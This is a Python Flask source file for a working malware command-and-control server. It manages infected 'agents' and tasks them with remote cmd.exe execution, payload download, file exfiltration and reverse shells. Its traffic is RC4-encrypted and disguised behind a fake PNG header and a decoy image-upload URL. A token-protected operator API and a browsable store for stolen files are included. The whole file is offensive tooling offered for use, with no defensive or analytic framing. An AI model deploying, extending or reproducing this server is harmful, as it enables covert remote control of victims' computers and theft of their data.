from flask import Flask, request, jsonify, abort, make_response
from flask_autoindex import AutoIndex
from Crypto.Cipher import ARC4
import hexdump
import struct
import zlib
import os
import time
import json
import sys

CMD_INFO                = b"INFO"[::-1]
CMD_HELLO_SERVER        = CMD_INFO
CMD_GET_TASK            = b'TASK'[::-1]

CMD_NONE                = b'NONE'[::-1]		# Do nothing
CMD_COMMAND			    = b'\x00CMD'[::-1]	# Command cmd.exe /k ??
CMD_REVERSE_SHELL		= b'4444'[::-1]		# Reverse Shell TCP
CMD_DOWNLOAD_FILE		= b'DOWN'[::-1]		# Download file
CMD_UPDATE_SLEEPTIME	= b'TIME'[::-1]		# Update sleep time
CMD_AGENT_HELLO_AGAIN   = b'HI!!'[::-1]     # Say hello to server again
CMD_UPLOAD_FILE         = B'UPLO'[::-1]     # Upload file

UPLOAD_DIR              = "./FileUpload"

app = Flask(__name__)

g_AgentMgr = None
g_Token = ""
g_UploadInfoList = []

class CAgent:
    def __init__(self, info, agentId, sleepTime = 10):
        self.info = info
        self.agentId = agentId
        self.job = CMD_NONE
        self.jobParams = {}
        self.prevJob = CMD_NONE
        self.jobResult = ""
        self.lastSeen = time.time()
        self.sleepTime = sleepTime
    
    def GetUploadDir(self):
        profileDir = self.info.replace("/", "@")
        uploadDir = UPLOAD_DIR + "/" + profileDir
        return uploadDir

class CAgentMgr:
    def __init__(self):
        self.agentList = []
    
    def AddAgent(self, agent):
        if self.IsAgentIdExist(agent.agentId) == False:
            self.agentList.append(agent)
    
    def IsAgentIdExist(self, agentId):
        for agent in self.agentList:
            if agent.agentId == agentId:
                return True
        return False
    
    def DeleteAgentById(self, agentId):
        idx = 0
        while idx < len(self.agentList):
            if agentId == self.agentList[idx].agentId:
                del self.agentList[idx]
            else:
                idx += 1
    
    def GetAgentById(self, agentId):
        for agent in self.agentList:
            if agent.agentId == agentId:
                return agent
        return None
        
        
class CUploadInfo:
    def __init__(self, agentId, filePath):
        self.filePath = filePath
        self.uploadId = zlib.crc32(filePath.encode())
        self.agentId = agentId
        
def u32(v):
    return struct.unpack("<I", v)[0]

def p32(v):
    return struct.pack("<I", v)

def p16(v):
    return struct.pack("<H", v)

def DecryptPacket(data):
    bodySize = u32(data[:4])
    
    data = data[4:]
    key = data[:16]
    body = data[16:]
        
    cipher = ARC4.new(key)
    return cipher.decrypt(body)

def EncryptPacket(data):
    key = os.urandom(16)
    cipher = ARC4.new(key)
    
    encrypted = cipher.encrypt(data)
    return p32(len(encrypted)) + key + encrypted


def HandleHelloPacket(data):
    global g_AgentMgr
    
    body = CMD_INFO
    
    sleepTime = u32(data[:4])
    computerInfo = data[4:].rstrip(b"\x00")
    agentId = zlib.crc32(computerInfo)
    
    if g_AgentMgr.IsAgentIdExist(agentId) == False:
        # New agent. We add new agent to list
        print("New agent with id %X" % agentId)
        g_AgentMgr.AddAgent(CAgent(computerInfo.decode(), agentId, sleepTime))
        body += p32(agentId)
    else:
        # Agent exist
        print("Agent exist")
        body += p32(agentId)
    
    return EncryptPacket(body)

def CraftPacketDoNothing(agent):
    body = CMD_NONE
    body += p32(agent.agentId)
    return EncryptPacket(body)

def CraftPacketUpdateSleep(agent):
    body = CMD_UPDATE_SLEEPTIME
    body += p32(agent.agentId)
    body += p32(agent.jobParams["sleepTime"])
    return EncryptPacket(body)

def CraftPacketCommand(agent):
    body = CMD_COMMAND
    body += p32(agent.agentId)
    body += agent.jobParams["param"].encode()
    
    # Fix null at string terminate
    body += b"\x00"
    return EncryptPacket(body)
 
def CraftPacketHelloServer(agentId):
    body = CMD_AGENT_HELLO_AGAIN
    body += p32(agentId)
    return EncryptPacket(body)

def CraftPacketDownload(agent):
    body = CMD_DOWNLOAD_FILE
    body += p32(agent.agentId)
    
    # Skip FF FE bytes while encoding
    body += agent.jobParams["downloadUrl"].ljust(256, "\x00").encode("utf-16")[2:]
    body += agent.jobParams["downloadFile"].ljust(256, "\x00").encode("utf-16")[2:]
    
    # Fix null at string terminate
    return EncryptPacket(body)

def CraftPacketUpload(agent):
    global g_UploadInfoList
    body = CMD_UPLOAD_FILE
    body += p32(agent.agentId)
    
    filePath = agent.jobParams["uploadFile"]
    uploadInfo = CUploadInfo(agent.agentId, filePath)
    g_UploadInfoList.append(uploadInfo)
    
    body += p32(uploadInfo.uploadId)
    body += filePath.ljust(256, "\x00").encode("utf-16")[2:]
    
    return EncryptPacket(body)

def CraftPacketReverseShell(agent):
    body = CMD_REVERSE_SHELL
    body += p32(agent.agentId)
    
    remoteHost = agent.jobParams["remoteHost"]
    port = agent.jobParams["port"]
    
    body += remoteHost.ljust(256, "\x00").encode()
    body += p16(port)
    return EncryptPacket(body)

def HandleUpdateSleeptimePacket(data, agent):
    agent.prevJob = CMD_UPDATE_SLEEPTIME
    status = u32(data[:4])
    newSleepTime = u32(data[4:8])
    if status == 1:
        agent.jobResult = "Successful"
        agent.sleepTime = newSleepTime
    else:
        agent.jobResult = "Failed"
    return CraftPacketDoNothing(agent)

def HandleCommandPacket(data, agent):
    agent.prevJob = CMD_COMMAND
    status = u32(data[:4])
    if status != 1:
        agent.jobResult = "failed"
    else:
        agent.jobResult = "\n-------------------------------CMD----------------------------------\n"
        agent.jobResult += data[4:].decode()
        agent.jobResult += "\n--------------------------------------------------------------------\n"
    return CraftPacketDoNothing(agent)

def HandleDownloadPacket(data, agent):
    agent.prevJob = CMD_DOWNLOAD_FILE
    status = u32(data[:4])
    if status == 1:
        agent.jobResult = "Successful"
    else:
        agent.jobResult = "Failed"
    return CraftPacketDoNothing(agent)

def HandleUploadPacket(data, agent):
    global g_UploadInfoList
    
    agent.prevJob = CMD_UPLOAD_FILE
    status = u32(data[:4])
    uploadId = u32(data[4:8])
    fileSize = u32(data[8:12])
    fileContent = data[12:]

    
    if fileSize != len(fileContent):
        print("Warning: fileSize != len(fileContent) | %d != %d" % (fileSize, len(fileContent)))
        
    if status == 1:
        agent.jobResult = "Successful"
        for uploadInfo in g_UploadInfoList[:]:
            if uploadInfo.uploadId == uploadId and uploadInfo.agentId == agent.agentId:
                # Task found. Create upload dir if it doesn't exist
                if os.path.exists(agent.GetUploadDir()) == False:
                   os.makedirs(agent.GetUploadDir())
                
                # TODO: Fix this on linux os.path.basename(uploadInfo.filePath)
                savedPath = agent.GetUploadDir() + "/" + os.path.basename(uploadInfo.filePath)
                if os.path.exists(savedPath):
                    os.remove(savedPath)
                
                f = open(savedPath, "wb")
                f.write(fileContent)
                f.close()
                g_UploadInfoList.remove(uploadInfo)
                break
        
        # Task not found. Skip
    elif status == 0:
        agent.jobResult = "Failed"
    elif status == 2:
        agent.jobResult = "File size too big (> 10MB)"
        
    return CraftPacketDoNothing(agent)

def HandleReverseShellPacket(data, agent):
    agent.prevJob = CMD_REVERSE_SHELL
    status = u32(data[:4])
    if status == 1:
        agent.jobResult = "Successful"
    else:
        agent.jobResult = "Failed"
    return CraftPacketDoNothing(agent)

def HandleGetTaskPacket(data, agent):
    if agent == None:
        # This should not happen
        return CraftPacketHelloServer(agentId)
    
    if agent.job == CMD_NONE:
        return CraftPacketDoNothing(agent)
    elif agent.job == CMD_UPDATE_SLEEPTIME:
        returnPacket = CraftPacketUpdateSleep(agent)
        agent.job = CMD_NONE
        agent.jobParams = {}
        return returnPacket
    elif agent.job == CMD_COMMAND:
        returnPacket = CraftPacketCommand(agent)
        agent.job = CMD_NONE
        agent.jobParams = {}
        return returnPacket
    elif agent.job == CMD_DOWNLOAD_FILE:
        returnPacket = CraftPacketDownload(agent)
        agent.job = CMD_NONE
        agent.jobParams = {}
        return returnPacket
    elif agent.job == CMD_UPLOAD_FILE:
        returnPacket = CraftPacketUpload(agent)
        agent.job = CMD_NONE
        agent.jobParams = {}
        return returnPacket
    elif agent.job == CMD_REVERSE_SHELL:
        returnPacket = CraftPacketReverseShell(agent)
        agent.job = CMD_NONE
        agent.jobParams = {}
        return returnPacket
        
    return b""
    

def HandlePostPacket(data):
    global g_AgentMgr
    
    fakePNGHeader = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x02, 0x74, 0x00, 0x00, 0x01, 0x53, 0x08,
                    0x06, 0x00, 0x00, 0x00, 0xB0, 0x28, 0x91, 0xDC, 0x00, 0x00, 0x00, 0x01, 0x73, 0x52, 0x47, 0x42, 0x00, 0xAE, 0xCE, 0x1C, 0xE9, 0x00, 0x00, 0x00, 0x04,
                    0x67, 0x41, 0x4D, 0x41, 0x00, 0x00, 0xB1, 0x8F, 0x0B, 0xFC, 0x61, 0x05, 0x00, 0x00, 0x00, 0x09, 0x70, 0x48, 0x59, 0x73, 0x00, 0x00, 0x12, 0x74, 0x00,
                    0x00, 0x12, 0x74, 0x01, 0xDE, 0x66, 0x1F, 0x78, 0x00, 0x00, 0x06, 0x0D, 0x49, 0x44, 0x41, 0x54])
    
    if fakePNGHeader != data[:len(fakePNGHeader)]:
        return b""
    
    packet = DecryptPacket(data[len(fakePNGHeader):])

    body = b""
    cmd = packet[:4]
    agentId = u32(packet[4:8])
    
    if cmd == CMD_INFO:
        body = HandleHelloPacket(packet[8:])
    else:
        if g_AgentMgr.IsAgentIdExist(agentId) == True:
            # Update last seen
            agent = g_AgentMgr.GetAgentById(agentId)
            agent.lastSeen = time.time()
            if cmd == CMD_GET_TASK:
                body = HandleGetTaskPacket(packet[8:], agent)
            elif cmd == CMD_UPDATE_SLEEPTIME:
                # Update time result
                body = HandleUpdateSleeptimePacket(packet[8:], agent)
            elif cmd == CMD_COMMAND:
                body = HandleCommandPacket(packet[8:], agent)
            elif cmd == CMD_DOWNLOAD_FILE:
                body = HandleDownloadPacket(packet[8:], agent)
            elif cmd == CMD_UPLOAD_FILE:
                body = HandleUploadPacket(packet[8:], agent)
            elif cmd == CMD_REVERSE_SHELL:
                body = HandleReverseShellPacket(packet[8:], agent)
        else:
            print("Agent ID %X doesn't exist. Total %d agent(s)" % (agentId, len(g_AgentMgr.agentList)))
            # Strange agentId. Ask agent to say hello again
            body = CraftPacketHelloServer(agentId)
    
    return fakePNGHeader + body
    
    
@app.route('/admin/edit/upload_image.aspx', methods=['POST'])
def MalEndpoint():
    data = request.get_data()
    returnData = HandlePostPacket(data)
    return returnData


def HandleClientCmd(data):
    if data["cmd"] == "verify":
        return jsonify({"status": "Ok"})
    elif data["cmd"] == "listagent":
        agentList = g_AgentMgr.agentList
        
        agentListJson = []
        for agent in agentList:
            data = {
                "agentId": agent.agentId,
                "info": agent.info,
                "lastSeen": agent.lastSeen
            }
            agentListJson.append(data)
        
        responseData = {
            "status": "Ok",
            "agentList": agentListJson
        }
        return jsonify(responseData), 200
    elif data["cmd"] == "info" and "agentId" in data:
        agent = g_AgentMgr.GetAgentById(data["agentId"])
        if agent == None:
            return jsonify({
                "status": "failed",
                "error": "Agent doesn't exist"
            }), 200
        else:
            return jsonify({
                "status": "Ok",
                "agentId": agent.agentId,
                "info": agent.info,
                "lastSeen": agent.lastSeen,
                "sleepTime": agent.sleepTime,
                "currentJob": u32(agent.job),
                "currentJobParams": agent.jobParams,
                "previousJob": u32(agent.prevJob),
                "jobResult": agent.jobResult
            }), 200
            
    elif data["cmd"] == "setsleep" and "agentId" in data:
        agent = g_AgentMgr.GetAgentById(data["agentId"])
        if agent == None:
            return jsonify({
                "status": "failed",
                "error": "Agent doesn't exist"
            }), 200
        else:
            # Set job to sleep
            agent.job = CMD_UPDATE_SLEEPTIME
            agent.jobParams = {"sleepTime": data["sleepTime"]}
            return jsonify({
                "status": "Ok",
            }), 200
    elif data["cmd"] == "command" and "agentId" in data:
        agent = g_AgentMgr.GetAgentById(data["agentId"])
        if agent == None:
            return jsonify({
                "status": "failed",
                "error": "Agent doesn't exist"
            }), 200
        else:
            agent.job = CMD_COMMAND
            agent.jobParams = {"param": data["param"]}
            return jsonify({
            "status": "Ok",
            }), 200
    elif data["cmd"] == "download" and "agentId" in data:
        agent = g_AgentMgr.GetAgentById(data["agentId"])
        if agent == None:
            return jsonify({
                "status": "failed",
                "error": "Agent doesn't exist"
            }), 200
        else:
            if len(data["downloadUrl"]) > 255 or len(data["downloadFile"]) > 255:
                return jsonify({
                    "status": "failed",
                    "error": "download URL or download file length > 255"
                }), 200
            agent.job = CMD_DOWNLOAD_FILE
            agent.jobParams = {"downloadUrl": data["downloadUrl"], "downloadFile": data["downloadFile"]}
            return jsonify({
                "status": "Ok",
            }), 200
    elif data["cmd"] == "upload" and "agentId" in data:
        agent = g_AgentMgr.GetAgentById(data["agentId"])
        if agent == None:
            return jsonify({
                "status": "failed",
                "error": "Agent doesn't exist"
            }), 200
        else:
            if len(data["uploadFile"]) > 255:
                return jsonify({
                "status": "failed",
                "error": "uploadFile length > 255"
                }), 200
            agent.job = CMD_UPLOAD_FILE
            agent.jobParams = {"uploadFile": data["uploadFile"]}
            return jsonify({
                "status": "Ok",
            }), 200
    elif data["cmd"] == "reverseshell" and "agentId" in data:
        agent = g_AgentMgr.GetAgentById(data["agentId"])
        if agent == None:
            return jsonify({
                "status": "failed",
                "error": "Agent doesn't exist"
            }), 200
        else:
            if len(data["remoteHost"]) > 255:
                return jsonify({
                "status": "failed",
                "error": "remoteHost length > 255"
                }), 200
            
            if data["port"] < 0 or data["port"] > 65535:
                return jsonify({
                "status": "failed",
                "error": "wrong port"
                }), 200
                
            agent.job = CMD_REVERSE_SHELL
            agent.jobParams = {"remoteHost": data["remoteHost"],
                                "port": data["port"]}
            
            return jsonify({
                "status": "Ok",
            }), 200
    else:
        return jsonify({
            "status": "failed",
            "error": "unknown command or missing agentId?"
        }), 200



@app.route('/client_api', methods=['POST'])
def ClientEndpoint():
    global g_AgentMgr
    if request.headers['Content-Type'] != 'application/json':
        return jsonify({'error': 'Content-Type must be application/json'}), 400
    
    data = json.loads(request.get_json())

    if "token" in data and data["token"] == g_Token:
        return HandleClientCmd(data)
    else:
        return jsonify({
        "status": "failed",
        "error": "Wrong token"
        }), 400


@app.route('/file_storage/', methods=['GET'])
@app.route('/file_storage/<path:path>', methods=['GET'])
def autoindex(path='.'):
    token = request.args.get("token")
    if token == None:
        token = request.cookies.get("token")
        
    if token == g_Token:
        resp_text = uploadFiles.render_autoindex(path)
        resp = make_response(resp_text)
        resp.set_cookie("token", token)
        return resp
    
    abort(403)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: server.py <port> <token>")
        exit()
        
    g_Token = sys.argv[2]
    g_AgentMgr = CAgentMgr()
    port = int(sys.argv[1])
    if os.path.exists(UPLOAD_DIR) == False:
        os.makedirs(UPLOAD_DIR)
    
    uploadFiles = AutoIndex(app, browse_root="./FileUpload", add_url_rules=False)
    app.run(debug=True, port=port)